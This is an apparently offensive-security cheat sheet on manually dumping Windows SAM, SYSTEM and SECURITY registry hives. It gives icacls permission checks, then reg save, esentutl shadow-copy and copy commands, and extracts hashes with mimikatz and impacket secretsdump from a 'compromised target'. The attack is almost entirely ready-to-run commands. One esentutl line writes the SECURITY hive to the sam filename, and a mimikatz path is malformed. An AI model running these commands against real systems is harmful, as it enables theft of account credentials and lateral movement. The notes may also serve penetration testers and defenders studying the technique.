# 01 - Manual

## 1.1 - Dumping SAM hashes manually

```
C:\> icacls c:\windows\system32\config\security
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)
           
C:\> icacls c:\windows\system32\config\system
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)

C:\> icacls c:\windows\system32\config\sam
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)
           
C:\> icacls C:\Windows\Repair\SAM
C:\Windows\Repair\SAM WS01\user:(R)
                      NT AUTHORITY\SYSTEM:(I)(F)
                      BUILTIN\Administrators:(I)(F)
                      BUILTIN\Users:(I)(RX)
                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                      APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\> icacls C:\Windows\Repair\SYSTEM
C:\Windows\Repair\SYSTEM WS01\user:(R)
                         NT AUTHORITY\SYSTEM:(I)(F)
                         BUILTIN\Administrators:(I)(F)
                         BUILTIN\Users:(I)(RX)
                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

If it was misconfigured that the users are allowed to access `BUILTIN\Users:(I)(RX)` to those sensitive credentials files or it could be on a particular user that was configured that allows it to access when it's the admin has the privileges have that ability such as `WS01\user:(R)` in this case.

### 1.1.1 - Save the hashes via `registry`

`C:\> reg save hklm\security c:\temp\security`

`C:\> reg save hklm\system c:\temp\system`

`C:\> reg save hklm\sam c:\temp\sam`

### 1.1.2 - Shadow copy `esentutl.exe`

`C:\> esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam`

`C:\> esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d c:\temp\security`

`C:\> esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d c:\temp\sam`

### 1.1.3 - Use the `copy` command

`C:\> copy C:\Windows\System32\config\SAM c:\temp\sam`

`C:\> copy C:\Windows\System32\config\SYSTEM c:\temp\system`

1. Dumping SAM credentials with `mimikatz`

`mimikatz # lsadump::secrets /system:c\:temp\system /security:c:\temp\security`

2. Dumping SAM credentials with `secretsdump`

Instead of storing the hashes on the compromised target use the **File Transfer techniques.** Once that the process is done we can dump the hashes using one of the impacket scripts called `secretsdump`.

The syntax for `secretsdump` is:

`$ secretsdump -sam sam -system system local`

`$ secretsdump -sam sam -security security -system system local`

---
## References

- [Credential Access and Credential Dumping: Dumping Hashes From SAM Registry](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry)

- [Credential Access and Credential Dumping: Dumping SAM via Esentutl](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe)

- [Credential Access and Credential Dumping: Dumping LSA Secrets](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)

- [Credential Access and Credential Dumping: Dumping and Cracking MSCash Cached Domain Credentials](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)

- [Hacking Articles: Credential Dumping SAM](https://www.hackingarticles.in/credential-dumping-sam/)

- [Wadcoms Impacket Secretsdump](https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/)